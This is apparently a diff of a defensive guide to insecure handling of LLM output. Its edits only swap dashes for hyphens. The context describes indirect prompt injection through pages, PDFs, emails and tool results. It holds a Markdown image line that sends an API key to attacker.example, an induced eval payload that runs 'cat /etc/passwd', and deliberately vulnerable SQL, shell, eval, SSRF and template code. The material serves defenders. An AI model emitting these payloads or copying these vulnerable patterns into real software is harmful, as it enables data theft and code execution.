@@ -29,7 +29,7 @@ Every attack in this category follows the same three-step chain. The attacker's 
   document/page/email)      shell chars, code)          eval, HTTP client)
 ```
 
-**Direct induction** is the attacker typing to the model. **Indirect induction** is the more dangerous variant: the attacker plants the payload in something the model will later read — a web page it summarizes, a PDF in a RAG store, an email in an inbox assistant, a tool's JSON response — so that a completely different, trusted user triggers the exploit. Because indirect induction is possible, **you cannot rely on trusting the user**; you must handle the output safely regardless of who prompted the model.
+**Direct induction** is the attacker typing to the model. **Indirect induction** is the more dangerous variant: the attacker plants the payload in something the model will later read - a web page it summarizes, a PDF in a RAG store, an email in an inbox assistant, a tool's JSON response - so that a completely different, trusted user triggers the exploit. Because indirect induction is possible, **you cannot rely on trusting the user**; you must handle the output safely regardless of who prompted the model.
 
 > **Working assumption for a defender:** the content of model output is fully attacker-controlled. Your safety must come from how you *handle* that output, never from hoping it is benign.
 
@@ -70,7 +70,7 @@ Attacker-uploaded document (indexed into the vector store):
 
 ## 3. Markdown Image & Link Exfiltration
 
-A zero-click data-theft vector that does not need JavaScript at all — only a Markdown renderer that auto-loads images. The attacker induces the model to place secrets into an image URL.
+A zero-click data-theft vector that does not need JavaScript at all - only a Markdown renderer that auto-loads images. The attacker induces the model to place secrets into an image URL.
 
 ```
 Induction (often indirect, hidden in a page/email the assistant reads):
@@ -80,7 +80,7 @@ Induction (often indirect, hidden in a page/email the assistant reads):
   ![loading](https://attacker.example/pixel?leak=<THE_API_KEY>)
 ```
 
-The browser fetches `https://attacker.example/pixel?leak=sk-...` automatically to render the image. No click, no script — the request itself is the exfiltration. The identical trick with a clickable link (`[click](https://attacker.example/?d=...)`) works when auto-loading images are blocked but links are allowed. **Root cause:** unrestricted URL schemes/hosts in rendered Markdown and no Content-Security-Policy to constrain outbound requests.
+The browser fetches `https://attacker.example/pixel?leak=sk-...` automatically to render the image. No click, no script - the request itself is the exfiltration. The identical trick with a clickable link (`[click](https://attacker.example/?d=...)`) works when auto-loading images are blocked but links are allowed. **Root cause:** unrestricted URL schemes/hosts in rendered Markdown and no Content-Security-Policy to constrain outbound requests.
 
 ## 4. SQL / NoSQL Injection from Output
 
@@ -96,7 +96,7 @@ cur.execute(f"SELECT * FROM products WHERE name = '{product}'")
 
 ## 5. OS Command Injection
 
-Anywhere model output reaches a shell — filenames, "run this utility," media conversion, git operations — shell metacharacters in the output become commands.
+Anywhere model output reaches a shell - filenames, "run this utility," media conversion, git operations - shell metacharacters in the output become commands.
 
 ```python
 # VULNERABLE: model output in a shell string
@@ -116,11 +116,11 @@ expr = llm(f"Write a Python expression that computes: {question}")
 answer = eval(expr)                     # arbitrary code execution
 ```
 
-**Induction:** get the model to emit `__import__('os').system('id; cat /etc/passwd')` instead of a math expression. JavaScript `eval`/`new Function`, Ruby `eval`, template `eval`, and unsafe deserializers (`pickle.loads`, `yaml.load`) are all equivalent sinks. **Root cause:** executing model output as code. There is no safe way to do this outside a strong sandbox — preferably not at all.
+**Induction:** get the model to emit `__import__('os').system('id; cat /etc/passwd')` instead of a math expression. JavaScript `eval`/`new Function`, Ruby `eval`, template `eval`, and unsafe deserializers (`pickle.loads`, `yaml.load`) are all equivalent sinks. **Root cause:** executing model output as code. There is no safe way to do this outside a strong sandbox - preferably not at all.
 
 ## 7. SSRF from Model-Supplied URLs
 
-Any feature where the model produces a URL that the server then fetches — "summarize this link," webhook callbacks, image fetch, tool calls — is an SSRF candidate.
+Any feature where the model produces a URL that the server then fetches - "summarize this link," webhook callbacks, image fetch, tool calls - is an SSRF candidate.
 
 ```python
 # VULNERABLE: server fetches a model-chosen URL
@@ -144,7 +144,7 @@ open(f"/srv/exports/{fname}", "w").write(content)     # traversal risk
 
 ## 9. Server-Side Template Injection (SSTI)
 
-When model output is embedded into a server-side template *string* (not passed as template data), template syntax in the output is evaluated by the template engine — frequently a path to RCE.
+When model output is embedded into a server-side template *string* (not passed as template data), template syntax in the output is evaluated by the template engine - frequently a path to RCE.
 
 ```python
 # VULNERABLE: output concatenated into a Jinja2 template source
